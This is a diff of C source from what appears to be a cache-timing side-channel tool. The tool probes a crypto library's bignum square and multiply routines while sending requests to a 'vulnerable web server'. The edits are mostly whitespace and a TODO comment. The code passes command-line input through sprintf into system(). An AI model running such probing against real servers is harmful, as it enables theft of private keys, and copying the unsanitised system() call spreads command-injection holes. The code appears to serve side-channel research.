@@ -16,7 +16,7 @@
 
 /*
 .text:000000000000678C bi_square       proc near
-.text:00000000000064AB bi_multiply     proc near	
+.text:00000000000064AB bi_multiply     proc near
 
 .text:00000000000064E0 regular_square  proc near    (boucle en +0xF7)
 .text:00000000000062C8 regular_multiply proc near   (boucle en +0xB3)
@@ -109,14 +109,14 @@ void *probe_thread(void *arg) {
 	multiply_addr += LIBCRYPTO_MULTIPLY_OFFSET;
 	bi_barrett_addr += LIBCRYPTO_BARRETT_OFFSET;
 	memset(results,0,RESULTS_SIZE);
-	
+
 	info("probe_thread started");
-	info("LIB is at      %p",library);	
+	info("LIB is at      %p",library);
 	info("square is at   %p",square_addr);
 	info("multiply is at %p",multiply_addr);
 	info("barrett is at  %p",bi_barrett_addr);
-	
-	int pos=0;	
+
+	int pos=0;
 	while(1) {
 		pthread_mutex_lock(&stopMutex);
 		if ( stop_probing ) {
@@ -154,11 +154,11 @@ int main(int argc, char **argv) {
 	}
 
 	/* Prepare the result buffer */
-    	results = (unsigned char *)malloc(RESULTS_SIZE);
+	results = (unsigned char *)malloc(RESULTS_SIZE);
 	if ( results == NULL ) {
 		error("Error in malloc !");
 	}
-	
+
 	/* Start the probing thread */
 	pthread_t probe_t;
 	if(pthread_create(&probe_t, NULL, probe_thread, NULL) == -1) {
@@ -166,6 +166,7 @@ int main(int argc, char **argv) {
 	}
 
 	/* Request HTTPS page from the vulnerable web server */
+	// TODO : use curl C lib, but later .... (or never)
 	char * cmd = (char *)malloc(256*sizeof(char));
 	sprintf(cmd,"wget https://%s:%s --no-check-certificate -q -O /dev/null",argv[1],argv[2]);
 	system(cmd);
